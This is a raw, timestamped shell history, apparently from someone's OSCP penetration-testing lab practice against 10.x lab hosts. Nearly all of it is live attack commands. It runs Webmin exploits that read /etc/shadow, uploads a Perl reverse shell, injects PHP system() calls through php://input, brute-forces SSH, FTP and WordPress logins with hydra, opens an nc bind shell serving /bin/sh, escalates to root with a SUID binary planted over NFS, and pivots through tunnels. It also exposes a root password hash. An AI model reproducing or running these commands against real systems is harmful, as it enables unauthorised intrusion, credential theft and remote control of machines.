 2328  2020-09-12 09:16  php 1997.php http://10.11.1.141:10000 10000 http /etc/shadow
 2329  2020-09-12 09:16  php 1997.php http://10.11.1.141 10000 http /etc/shadow
 2330  2020-09-12 09:18  php -f 1997.php 10.11.1.141 10000 http /etc/passwd\n
 2331  2020-09-12 09:18  perl 2017.pl 10.11.1.141 10000 /etc/passwd 0
 2332  2020-09-12 09:19  \\ 
 2333  2020-09-12 09:23  cat tcp_10000_http_nikto.txt
 2334  2020-09-12 09:27  searchsploit webmin\n
 2335  2020-09-12 09:28  cat 2017.pl
 2336  2020-09-12 09:31  perl 2017.pl 10.11.1.141 10000 /etc/shadow 0
 2337  2020-09-12 09:57  sudo ssh -N -D   127.0.0.1:9050 sean@10.11.1.251
 2338  2020-09-12 09:57  ssh bob@10.11.1.141
 2339  2020-09-12 10:11  ssh alicwe@10.11.1.141
 2340  2020-09-12 10:11  ssh alice@10.11.1.141
 2341  2020-09-12 10:20  cp /usr/share/webshells/perl/perl-reverse-shell.pl rshell.cgi
 2342  2020-09-12 10:20  vim rshell.cgi
 2343  2020-09-12 10:21  sudo nc -nlvp 4000
 2344  2020-09-12 10:24  perl 2017.pl 10.11.1.141 10000 /home/bob/rshell.cgi 0
 2345  2020-09-12 10:44  git commit -m "finished fc4"
 2346  2020-09-12 10:45  $ sudo nmap -sn 10.11.1.0/24
 2347  2020-09-12 10:45  o nmap -sn 10.11.1.0/24
 2348  2020-09-12 10:46  autorecon 10.11.1.220
 2349  2020-09-12 11:55  curl https://10.11.1.217/vtigercrm/graph.php\?current_language\=../../../../../../../..//etc/amportal.conf%00\&module\=Accounts\&action
 2350  2020-09-12 12:06  locate / grep php/webapps/38078.py
 2351  2020-09-12 12:06  locate / | grep php/webapps/38078.py
 2352  2020-09-12 12:07  vim /usr/share/exploitdb/exploits/php/webapps/38078.py
 2353  2020-09-12 12:11  vim php/webapps/18650.py
 2354  2020-09-12 12:12  locate / | grep php/webapps/18650.py
 2355  2020-09-12 12:17  vim /usr/share/exploitdb/exploits/php/webapps/18650.py
 2356  2020-09-12 12:17  cp /usr/share/exploitdb/exploits/php/webapps/18650.py ../exploit
 2357  2020-09-12 12:17  vim1
 2358  2020-09-12 12:24  cat root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7::: >> passwd.txt
 2359  2020-09-12 12:52  touchvim
 2360  2020-09-12 12:52  touch peal.pl
 2361  2020-09-12 12:52  vim peal.pl
 2362  2020-09-12 12:58  vim suid
 2363  2020-09-12 12:59  cc -o ex_perl ex_perl.c
 2364  2020-09-12 12:59  cc -o ex_perl suid.c
 2365  2020-09-12 13:06  cherrytree ../../10.11.1.136/report/sufferingthisisredone.ctb
 2366  2020-09-12 13:08  ./ l
 2367  2020-09-12 13:14  cat 18650.py
 2368  2020-09-12 13:23  git commit -m "finished hotline"
 2369  2020-09-12 20:25  cd rews
 2370  2020-09-12 20:32  autorecon 10.11.1.226
 2371  2020-09-12 20:32  autorecon 10.11.1.229
 2372  2020-09-12 20:41  sshuttle -r sean@10.1.1.246 127.0.0.1:9050
 2373  2020-09-12 20:42  sshuttle -h
 2374  2020-09-12 20:50  sshuttle -r sean@10.1.1.246sshuttle 127.0.0.1:9050 sean@10.11.1.251:9050  10.1.1.0/24
 2375  2020-09-12 20:50  sshuttle -r sean@10.1.1.246sshuttle 127.0.0.1:9050 sean@10.11.1.251:9050  10.1.1.0/
 2376  2020-09-12 20:50  sshuttle -r sean@10.1.1.246sshuttle 127.0.0.1:9050 sean@10.11.1.251:9050  10.1.1.0
 2377  2020-09-12 20:50  sshuttle 127.0.0.1:9050 sean@10.11.1.251:9050  10.1.1.0/24
 2378  2020-09-12 20:50  sshuttle 127.0.0.1:9050 sean@10.11.1.251  10.1.1.0/24
 2379  2020-09-12 20:50  sshuttle sean@10.11.1.251  10.1.1.0/24
 2380  2020-09-12 20:51  sshuttle -r sean@10.1.1.246 10.1.1.0
 2381  2020-09-12 20:51  sshuttle -r sean@10.11.1.251 10.1.1.0
 2382  2020-09-12 21:07  sshuttle -r 127.0.0.1:9050 sean@10.11.1.251 10.1.1.0/24
 2383  2020-09-12 21:07  sshuttle -r  sean@10.11.1.251 127.0.0.1:9050 10.1.1.0/24
 2384  2020-09-12 21:16  sudo autorecon 10.11.1.226
 2385  2020-09-12 21:21  cat tcp_25_smtp_user-enum.txt
 2386  2020-09-12 21:39  cat tcp_587_smtp_nmap.txt
 2387  2020-09-12 23:26  ping 10.1.1.27
 2388  2020-09-12 23:29  rm -rf 10.1.1.27
 2389  2020-09-12 23:30  sudo rm -rf 10.1.1.27
 2390  2020-09-12 23:30  sudo autorecon 10.1.1.27
 2391  2020-09-13 19:51  sqlmap -r login.req --dbms=MSSQL -p ctl00%24MainContent%24emailBox --level=5 --risk=3  --dbs
 2392  2020-09-13 22:10  sudo service xrdp start
 2393  2020-09-13 22:18  cat tcp_587_smtp_user-enum.txt
 2394  2020-09-13 22:23  rdp
 2395  2020-09-13 22:24  cat tcp_49155_rpc_nmap.txt
 2396  2020-09-13 22:27  rpcclient -p 3389 -U "webadmin" 10.11.1.229
 2397  2020-09-13 22:37  rpcclient -p 3389 -U "" 10.11.1.229
 2398  2020-09-13 22:38  cat tcp_110_pop3_nmap.txt
 2399  2020-09-13 22:39  cat tcp_143_imap_nmap.txt
 2400  2020-09-13 22:44  rdesktop
 2401  2020-09-13 23:09  cd kali
 2402  2020-09-14 01:51  cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
 2403  2020-09-14 05:30  sudo cp ~/Downloads/PSTools.zip ./
 2404  2020-09-14 05:44  git commit -m "finished mail"
 2405  2020-09-14 07:22  nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN 
 2406  2020-09-14 07:22  nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN  10.1.1.27
 2407  2020-09-14 07:23  nmap -A 10.1.1.27
 2408  2020-09-14 07:29  -rw-r--r-- 1 kali kali  940 Sep 14 04:16 smbmap-execute-command.txt
 2409  2020-09-14 07:30  smbclient  //10.11.1.231/tmp -U ""
 2410  2020-09-14 07:34  nmap -p 1-65535 -sV -sS -T4 10.1.1.27
 2411  2020-09-14 07:34  sudo nmap -p 1-65535 -sV -sS -T4 10.1.1.27
 2412  2020-09-14 07:34  nmap -v -sS -A -T4 10.1.1.27
 2413  2020-09-14 07:37  nmap -sU -sV --top-ports 20 10.1.1.27
 2414  2020-09-14 07:37  sudo nmap -sU -sV --top-ports 20 10.1.1.27
 2415  2020-09-14 07:38  nmap -sC -sV 10.1.1.27
 2416  2020-09-14 07:38  cat out.11385.txt
 2417  2020-09-14 07:38  strings out.11385.txt
 2418  2020-09-14 07:39  strings out.11386.txt out.12829.txt
 2419  2020-09-14 07:40  mv grep -lir 'out.' ./ | mv ../exploit
 2420  2020-09-14 07:40  mv grep -lir 'out.' ./ | mv  -t../exploit
 2421  2020-09-14 07:41  mv grep -lir 'out.' ./ | mv  -t ../exploit
 2422  2020-09-14 07:41  xargs 
 2423  2020-09-14 07:41  mv grep -lir 'out.' ./ | xargs  mv  -t ../exploit
 2424  2020-09-14 07:42  mv `grep -lir 'out.' ./` ../exploit
 2425  2020-09-14 07:42  mv `grep -lir 'out.' ./ ` ../exploit
 2426  2020-09-14 07:42  mv `grep -lir 'out'./ ` ../exploit
 2427  2020-09-14 07:42  mv `grep -lir 'out'./` ../exploit
 2428  2020-09-14 07:42  mv `grep -lir 'out' ./` ../exploit
 2429  2020-09-14 07:43  mv out.11385.txt out.11386.txt out.12829.txt out.13322.txt out.14292 out.15733.txt out.1999.txt out.23102.txt out.24115.txt out.26626.txt ../exploit/
 2430  2020-09-14 07:44  mv out.14292.txt out.24927.txt out.25604.txt out.30232.txt out.30373.txt out.5083.txt out.6247.txt out.7562.txt out.8447.txt out.8711.txt out.910.txt ../exploit
 2431  2020-09-14 07:45  mv smbmap-execute-command.txt smbmap-share-permissions.txt tcp_111_nfs_nmap.xml tcp_111_rpc_nmap.xml tcp_22_ssh_nmap.xml ../scans
 2432  2020-09-14 07:45  mv tcp_139_smb_nmap.xml tcp_25_smtp_nmap.xml tcp_25_smtp_user-enum.txt tcp_445_smb_nmap.xml ../scans
 2433  2020-09-14 07:45  mv _full_tcp_nmap.xml enum4linux.txt ../scans
 2434  2020-09-14 07:45  mv _quick_tcp_nmap.xml ../scans
 2435  2020-09-14 07:46  strings *
 2436  2020-09-14 07:46  cd scan
 2437  2020-09-14 07:47  cat tcp_139_smb_nmap.xml
 2438  2020-09-14 07:50  searchsploit Samba 4.2.10-Debian
 2439  2020-09-14 09:22  find / | grep Samba 3.5.0 < 4.4.14/4.5.10/4.6.4
 2440  2020-09-14 09:22  find / | grep Samba 3.5.0 
 2441  2020-09-14 09:23  find / | grep aamba 3.5.0 
 2442  2020-09-14 09:23  find / | grep Samba 
 2443  2020-09-14 09:32  pip install pysmbclient
 2444  2020-09-14 09:32  pip install --user pysmbclient
 2445  2020-09-14 09:34  touch smbpy/py
 2446  2020-09-14 09:34  touch smbpy.py
 2447  2020-09-14 09:34  vim smbpy.py
 2448  2020-09-14 09:34  chmod +x smbpy.py
 2449  2020-09-14 09:35  python smbpy.py -s 10.11.1.231 -c 'id > /tmpid.txt'
 2450  2020-09-14 09:36  cd t
 2451  2020-09-14 09:36  cd ~/OSCP/results/10.11.1.231/exploit
 2452  2020-09-14 09:37  ./smbpy.py
 2453  2020-09-14 09:37  python smbpy.py -s 10.11.1.231 -c 'id > /tmp/id.txt'
 2454  2020-09-14 09:38  sudo apt-get install smbclient\n
 2455  2020-09-14 09:38  pip install --user pysmbclient\n
 2456  2020-09-14 09:38  python sambahunter.py -h\n
 2457  2020-09-14 09:38  python smbpy.py -h\n
 2458  2020-09-14 09:38  python smbpy.py -s 10.11.1.231 
 2459  2020-09-14 09:38  python smbpy.py -s 10.11.1.231 -c ls
 2460  2020-09-14 09:39  sudo tcpdump -i tun0 icmp
 2461  2020-09-14 09:39  python smbpy.py -s 10.11.1.231 -c ping 192.168.119.217
 2462  2020-09-14 09:39  python smbpy.py -s 10.11.1.231 -c 'ping 192.168.119.217'
 2463  2020-09-14 09:44  smbclient  //10.11.1.231/docs  -U ""
 2464  2020-09-14 09:48  strings user02.txt
 2465  2020-09-14 09:48  string  user05.txt
 2466  2020-09-14 09:48  strings  user05.txt
 2467  2020-09-14 09:53  vim cleanup.sh
 2468  2020-09-14 09:53  nc -ltp 9931 -e /bin/sh &\n
 2469  2020-09-14 10:00  c ers
 2470  2020-09-14 10:30  cat cleanup.sh
 2471  2020-09-14 10:32  nc -ltp 9931 -e /bin/sh \n
 2472  2020-09-14 10:38  vim log
 2473  2020-09-14 10:40  git commit -m "mailman"
 2474  2020-09-14 10:41  git rm --cached results/10.11.1.231/exploit/log
 2475  2020-09-14 10:41  git rm --cached 
 2476  2020-09-14 10:41  git rm --cached *
 2477  2020-09-14 10:43  cp 10.11.1.231 ~
 2478  2020-09-14 10:43  cp 10.11.1.231 -r ~
 2479  2020-09-14 10:44  mv -rf 10.11.1.231 OSCP/results/
 2480  2020-09-14 10:44  mv -f 10.11.1.231 OSCP/results/
 2481  2020-09-14 10:45  mv  10.11.1.231 OSCP/results/
 2482  2020-09-14 10:45  mv  10.11.1.231 OSCP/results/10.11.1.231
 2483  2020-09-14 10:45  git add 8
 2484  2020-09-14 10:45  git commit -m "finished mailmen not really need to go back"
 2485  2020-09-14 10:45  git rm results/10.11.1.231/exploit/log
 2486  2020-09-14 10:46  mv 10.11.1.231 -r ~
 2487  2020-09-14 10:46  mv -r 10.11.1.231 ~
 2488  2020-09-14 10:47  mv  10.11.1.231 ~
 2489  2020-09-14 10:48  find / | grep results/10.11.1.231/exploit/log
 2490  2020-09-14 19:22  sudo nc -nv 10.11.1.231 9931
 2491  2020-09-14 19:24  git revert --no-edit HEAD~3
 2492  2020-09-14 19:26  git reset --hard origin master
 2493  2020-09-14 19:26  git reset --hard origin
 2494  2020-09-14 19:28  rm log
 2495  2020-09-14 19:30  cd 10.11.1.231/
 2496  2020-09-14 19:30  mv 10.11.1.111 ~/OSCP/results/
 2497  2020-09-14 19:30  mv 10.11.1.231 ~/OSCP/results/10.11.1.231
 2498  2020-09-14 19:31  git commit -m "finished mailmen"
 2499  2020-09-14 19:31  gt push
 2500  2020-09-14 19:34  nmap -v -sS -A -T4 target\n\n
 2501  2020-09-14 19:35  nmap 10.1.1.27 -sW\n
 2502  2020-09-14 19:36  nmap -Pn 10.1.1.27 \n
 2503  2020-09-14 19:38  nmap -Pn -sT 10.1.1.27 \n
 2504  2020-09-14 19:43  nmap  -sT 10.1.1.27 \n
 2505  2020-09-14 19:44  nmap 10.1.1.27 --top-ports 2000
 2506  2020-09-14 19:45  nmap --script smb-enum-shares.nse -p445 10.1.1.27
 2507  2020-09-14 19:45  nmap --script smb-enum-shares.nse -p139 10.1.1.27
 2508  2020-09-14 19:47  nmap -sC -p 139,445 -sV 10.1.1.27
 2509  2020-09-14 19:49  smbmap 10.1.1.27
 2510  2020-09-14 19:49  smbmap -H 10.1.1.27
 2511  2020-09-14 19:50  smbmap -H 10.1.1.27 -R
 2512  2020-09-14 19:51  nmap 10.1.1.27 --top-ports 1000
 2513  2020-09-14 19:58  smbclient -L \\10.1.1.27
 2514  2020-09-14 20:01  nmap -p445 --script smb-protocols 10.1.1.27
 2515  2020-09-14 20:05  nikto -h  http://10.1.1.27/ -o niktoscan
 2516  2020-09-14 20:05  nikto -h  http://10.1.1.27/ 
 2517  2020-09-14 20:13  vim curl
 2518  2020-09-14 20:16  curl -s --data "<?system('locate / | grep python');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
 2519  2020-09-14 20:17  curl -s --data "<?system('ls');?>" "http://10.1.1.27/browse.php?p=php://input%00"
 2520  2020-09-14 20:17  curl -s --data "<?system('whoami');?>" "http://10.1.1.27/browse.php?p=php://input%00"
 2521  2020-09-14 20:18  searchsploit 5.5.38 
 2522  2020-09-14 20:18  searchsploit php 5.5.38 
 2523  2020-09-14 20:34  Mark
 2524  2020-09-14 20:36  cd OSCP/l;
 2525  2020-09-14 20:37  #hydra -L mark -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e nsr -s 22 -o /home/kali/OSCP/results/10.11.1.35/scans/tcp_22_ssh_hydra.txt ssh://10.1.1.27
 2526  2020-09-14 20:37  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt passwd.txt
 2527  2020-09-14 20:39  #hydra -l mark -P /usr/share/wordlists/rockyou.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 2528  2020-09-14 20:39  ssh 10.1.1.27
 2529  2020-09-14 20:39  cd ~/OSCP/results/10.11.1.35/scans 
 2530  2020-09-14 20:41  nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /home/kali/OSCP/results/results/10.11.1.35/scans/tcp_22_ssh_nmap.txt
 2531  2020-09-14 20:41  nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN 
 2532  2020-09-14 20:41  nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods 10.1.1.27
 2533  2020-09-14 21:12  hydra -L mark -P /usr/share/wordlists/rockyou.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 2534  2020-09-14 21:12  hydra -l mark -P /usr/share/wordlists/rockyou.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 2535  2020-09-14 21:15  cat tcp_21_ftp_hydra.txt
 2536  2020-09-14 21:17  hydra -l mark  -P /usr/share/wordlists/rockyou.txt  -e nsr -s 21 -o ftp.txt ftp://10.1.1.27
 2537  2020-09-14 21:19  cd ~/OSCP/it_dept/results/10.1.1.27/scans
 2538  2020-09-14 21:19  vim tcp_22_ssh_hydra.txt `
 2539  2020-09-14 21:19  vim tcp_22_ssh_hydra.txt 
 2540  2020-09-14 21:20  sudo hydra -l mark -P /usr/share/wordlists/rockyou.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 2541  2020-09-14 21:23  locate / | grep  dirb/wordlists/common.txt
 2542  2020-09-14 21:42  sudo hydra -l mark -P /usr/share/dirb/wordlists/common.txt -e nsr -s 21 -o commftp.txt ftp://10.1.1.27
 2543  2020-09-14 21:43  ccd scans
 2544  2020-09-14 21:44  gobuster dir -u http://10.1.1.13:80/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys"
 2545  2020-09-14 21:44  sudo gobuster dir -u http://10.1.1.13:80/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys"
 2546  2020-09-14 21:53  sudo hydra -l mark -P /usr/share/dirb/wordlists/common.txt -e nsr -s 21 -o commftp.txt ftp://10.1.1.27\n
 2547  2020-09-14 21:53  sudo hydra -l mark  -P /usr/share/wordlists/rockyou.txt  -e nsr -s 21 -o ftp.txt ftp://10.1.1.27
 2548  2020-09-14 21:53  sudo gobuster dir -u http://10.1.1.27:80/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys"
 2549  2020-09-14 23:17  sudo gobuster dir -u http://10.1.1.27:80/browse.php -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys"
 2550  2020-09-14 23:18  sudo gobuster dir -u http://10.1.1.27:80/browse.php -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys.php"
 2551  2020-09-14 23:19  locate / | grep  wfuzz
 2552  2020-09-14 23:20  sudo gobuster dir -u http://10.1.1.27:80/ -w /usr/share/wfuzz/wordlist/general/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys.php"
 2553  2020-09-14 23:32  locate / | grep  uncommon
 2554  2020-09-14 23:33  locate / | grep  uncommon.txt
 2555  2020-09-14 23:36  #nikto -h  http://10.1.1.27/ 
 2556  2020-09-14 23:36  nikto 
 2557  2020-09-14 23:36  nikto -h  http://10.1.1.27/ -o nikto.txt
 2558  2020-09-14 23:36  touch nikto.txt
 2559  2020-09-14 23:36  sudo nikto -h  http://10.1.1.27/ -o nikto.txt
 2560  2020-09-14 23:41  sk
 2561  2020-09-14 23:41  sudo touch passwd.txt
 2562  2020-09-14 23:41  sudo vim passwd.txt
 2563  2020-09-14 23:48  sudo hydra -l megan  -P /usr/share/wordlists/rockyou.txt  -e nsr -s 21 -o ftp.txt ftp://10.1.1.27
 2564  2020-09-14 23:51  cd soc
 2565  2020-09-14 23:52  searchsploit php powerbrowse
 2566  2020-09-14 23:52  searchsploit powerbrowse
 2567  2020-09-14 23:52  searchsploit power browse
 2568  2020-09-14 23:53  cat php/webapps/40204.txt
 2569  2020-09-14 23:53  locate / | grep php/webapps/40204.txt
 2570  2020-09-14 23:53  cat /usr/share/exploitdb/exploits/php/webapps/40204.txt\n
 2571  2020-09-15 00:08  locate / | grep common.txt
 2572  2020-09-15 00:09  vim /usr/share/dirb/wordlists/common.txt
 2573  2020-09-15 00:09  vim /usr/share/dict/theHarvester/common.txt
 2574  2020-09-15 00:09  vi m/usr/share/seclists/Discovery/Web-Content/common.txt
 2575  2020-09-15 00:09  vim /usr/share/seclists/Discovery/Web-Content/common.txt
 2576  2020-09-15 00:10  locate / | grep rockyou.txt
 2577  2020-09-15 00:10  cd /usr/share/wordlists/
 2578  2020-09-15 00:10  vim rockyou.txt
 2579  2020-09-15 01:07  locate / | grep wordlist/general/common.txt
 2580  2020-09-15 01:08  hydra -l megan -P /usr/share/wfuzz/wordlist/general/common.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 2581  2020-09-15 01:20  /usr/share/wfuzz/wordlist/general/common.txt
 2582  2020-09-15 02:30  cd ex
 2583  2020-09-15 02:31  cherrytree humble.ctb
 2584  2020-09-15 02:44  vim tcp_22_ssh_hydra.txt u
 2585  2020-09-15 02:44  sudo cherrytree CTF_template.ctb
 2586  2020-09-15 02:46  cat directoys
 2587  2020-09-15 02:46  cat nikto.txt
 2588  2020-09-15 03:33  sudo apt install nfs-kernel-server
 2589  2020-09-15 03:33  vim  /etc/exports
 2590  2020-09-15 03:36  sudo /etc/init.d/nfs-kernel-server restart
 2591  2020-09-15 03:38  nmap -sV --script=nfs-showmount 10.1.1.27
 2592  2020-09-15 03:39  sudo showmount -e 10.1.1.27
 2593  2020-09-15 03:41  sudo which  showmount 
 2594  2020-09-15 03:41  /usr/sbin/showmount -e 10.1.1.27
 2595  2020-09-15 03:58  ssh -f -N megan@10.1.1.27 -L 2099:127.0.0.1:2099
 2596  2020-09-15 04:10  gcc -o exploit suid.c
 2597  2020-09-15 04:19  sudo fuser -k 2049/tcp
 2598  2020-09-15 04:26  cd /
 2599  2020-09-15 04:27  cd srv
 2600  2020-09-15 04:33  mount -t nfs 127.0.0.1:/srv/Share /tmp
 2601  2020-09-15 04:49  ssh -f -N megan@10.1.1.27 -L 2049:127.0.0.1:2049
 2602  2020-09-15 04:52  sudo vim /etc/exports
 2603  2020-09-15 04:55  sudo  mount -t nfs 127.0.0.1:/srv/Share /tmp
 2604  2020-09-15 04:56  touh test
 2605  2020-09-15 04:58  mv exploit /tmp
 2606  2020-09-15 04:59  chmod +s exploit
 2607  2020-09-15 05:02  gcc -o root suid.c
 2608  2020-09-15 05:03  chown root exploit 
 2609  2020-09-15 05:03  sudo chown root exploit 
 2610  2020-09-15 05:03  sudo chown root.root exploit 
 2611  2020-09-15 05:04  chmod +sx root
 2612  2020-09-15 05:04  chown root.root root
 2613  2020-09-15 05:05  mv root /tmp/
 2614  2020-09-15 05:06  mv root ~
 2615  2020-09-15 05:06  sudo chmod +sx root
 2616  2020-09-15 05:06  sudo chown root.root root
 2617  2020-09-15 05:06  sudo mv root /tmp
 2618  2020-09-15 05:09  ssh megan@10.1.1.27
 2619  2020-09-15 05:13  sudo gcc -o rootpp suid.c
 2620  2020-09-15 05:13  sudo chmod +xs rootpp
 2621  2020-09-15 05:14  sudo mv rootpp /tmp
 2622  2020-09-15 05:26  vim CTF_template.ctb
 2623  2020-09-15 05:29  cat /etc/exports
 2624  2020-09-15 05:32  cat suid.c
 2625  2020-09-15 05:34  cd /tml
 2626  2020-09-15 05:37  cd ~/OSCP/it_dept/
 2627  2020-09-15 05:38  sudo mv share.ctb ./results/10.1.1.27/report
 2628  2020-09-15 05:39  git commit -m "finished share .27"
 2629  2020-09-15 05:39  gi tpush
 2630  2020-09-15 06:42  cp share.ctb ~/
 2631  2020-09-15 06:42  git reset --soft
 2632  2020-09-15 06:42  git reset --hard
 2633  2020-09-15 06:44  lcd 10.1.1.27
 2634  2020-09-15 06:49  sudo rm  hydra.restore
 2635  2020-09-15 06:49  sudo rm -rf xml
 2636  2020-09-15 06:50  cd /OSCP/it_dept/results/10.1.1.27/report 
 2637  2020-09-15 06:50  cd /OSCP/it_dept/results/10.1.1.27/
 2638  2020-09-15 06:50  cd ~/OSCP/it_dept/results/10.1.1.27/
 2639  2020-09-15 06:50  mv suid.c ../exploit
 2640  2020-09-15 06:50  sudo mv suid.c ../exploit
 2641  2020-09-15 06:51  git commit -m "finished share"
 2642  2020-09-15 06:53  git status
 2643  2020-09-15 06:54  cp ~/OSCP/it_dept/results/10.1.1.27/report/share.ctb ./
 2644  2020-09-15 06:54  git reset --hard HEAD~1\n
 2645  2020-09-15 06:54  sudo git reset --hard HEAD~1\n
 2646  2020-09-15 06:54  ,
 2647  2020-09-15 06:55  sudo mv share.ctb suid.c ~/OSCP/it_dept/results/10.1.1.27/report
 2648  2020-09-15 06:55  sudo cherrytree share.ctb
 2649  2020-09-15 07:12  rm hydra.restore
 2650  2020-09-15 07:12  cd results/10.1.1.27/report
 2651  2020-09-15 07:12  cp share.ctb ~
 2652  2020-09-15 07:12  lll
 2653  2020-09-15 07:13  cp share.ctb OSCP/it_dept/
 2654  2020-09-15 07:14  cd 10.1.1.27/report
 2655  2020-09-15 07:14  sudo mkdir exploit
 2656  2020-09-15 07:14  cherrtree share.ctb
 2657  2020-09-15 07:15  vim suid.c
 2658  2020-09-15 07:16  sudo vim suid.c
 2659  2020-09-15 07:16  git commit -m "finsihed share"
 2660  2020-09-15 08:35  nmap 10.1.1.224
 2661  2020-09-15 08:37  nmap -sV -o blue --script=safe 10.1.1.224
 2662  2020-09-15 08:41  vim blue
 2663  2020-09-15 08:41  rm blue
 2664  2020-09-15 08:41  nmap --top-ports 1000 10.11.1.224
 2665  2020-09-15 08:41  nmap --top-ports 1000 10.1.1.224
 2666  2020-09-15 09:04  sshuttle -r  sean@10.11.1.251 10.1.1.0/24
 2667  2020-09-15 09:05  nmap -st 10.1.1.224
 2668  2020-09-15 09:05  nmap -sT 10.1.1.224
 2669  2020-09-15 09:09  sudo autorecon 10.11.1.234
 2670  2020-09-15 09:17  scp nmap-7.80.tar.bz2 sean@10.11.1.251:~
 2671  2020-09-15 09:25  nnmap 10.11.1.223\n
 2672  2020-09-15 09:25  nmap 10.11.1.223\n
 2673  2020-09-15 09:28  nmap -sn 10.1.1.0/24
 2674  2020-09-15 09:28  nmap -sn 10.10.1.0/24
 2675  2020-09-15 09:29  nmap 10.11.1.224\n
 2676  2020-09-15 09:29  nmap 10.1.1.224\n
 2677  2020-09-15 09:42  cd lib
 2678  2020-09-15 09:43  ssh 10.1.1.224
 2679  2020-09-15 09:54  proxychains ssh -f -N -D 10050 workstation_2@172.168.4.30 -p 2222\n
 2680  2020-09-15 09:56  nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.224
 2681  2020-09-15 10:04  autorecon 10.11.1.223
 2682  2020-09-15 11:06  vim /usr/share/exploitdb/exploits/php/webapps/33070.py
 2683  2020-09-15 11:07  cp  /usr/share/exploitdb/exploits/php/webapps/33070.py
 2684  2020-09-15 11:07  cp  /usr/share/exploitdb/exploits/php/webapps/33070.py ./
 2685  2020-09-15 19:21  cd results/10.11.1.223
 2686  2020-09-15 19:22  cat tcp_443_https_nikto.txt
 2687  2020-09-15 19:22  python 33070.py http://10.11.1.223/index.php 
 2688  2020-09-15 19:24  ssh _R
 2689  2020-09-15 19:25  ssh -R
 2690  2020-09-15 19:28  locate /  | grep  33070.py
 2691  2020-09-15 19:31  vim /usr/share/exploitdb/exploits/php/webapps/33070.py\n
 2692  2020-09-15 19:33  wpscan --url http://10.11.1.234:80/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_wpscan.txt"
 2693  2020-09-15 19:35  mkdir 10.1.1.223
 2694  2020-09-15 19:35  touch nmap
 2695  2020-09-15 19:49  vim nmap
 2696  2020-09-15 19:50  sudo gobuster dir -u http://10.1.1.223:80/ -w /usr/share/wfuzz/wordlist/general/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys"
 2697  2020-09-15 19:51  gobuster dir -u http://10.1.1.223:80/ -w /usr/share/wfuzz/wordlist/general/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "directoys" \n
 2698  2020-09-15 20:26  nmap --exclude-ports 1-100 10.1.1.234
 2699  2020-09-15 20:31  nmap 10.1.1.234
 2700  2020-09-15 20:31  nmap --exclude-ports 1-100 10.10.1.234
 2701  2020-09-15 20:31  nmap --exclude-ports 1-100 10.11.1.234
 2702  2020-09-15 20:31  nmap  10.11.1.234
 2703  2020-09-15 20:32  nmap  -sT 10.11.1.234
 2704  2020-09-15 20:33  sudo nmap  -sU -p 10.11.1.234
 2705  2020-09-15 20:33  sudo nmap  -sU -p  123,161,162 10.11.1.234
 2706  2020-09-15 20:33  sudo nmap  -A 10.11.1.234
 2707  2020-09-15 20:37  nmap  -sT -i 10.11.1.234
 2708  2020-09-15 20:37  nmap  -sT -p 10.11.1.234
 2709  2020-09-15 20:38  nmap  -sT -p- scans all ports 10.11.1.234
 2710  2020-09-15 21:20  hydra  -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://10.11.1.234/path/to/login.php:username=nina
 2711  2020-09-15 21:20  hydra  -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://http://10.11.1.234/wp-login.php:username=nina
 2712  2020-09-15 21:21  hydra  -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://10.11.1.234/path/to/login.php
 2713  2020-09-15 21:24  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://10.11.1.234//wp-login.php:username=^USER^&password=^PASS^:invalid-login-message\n
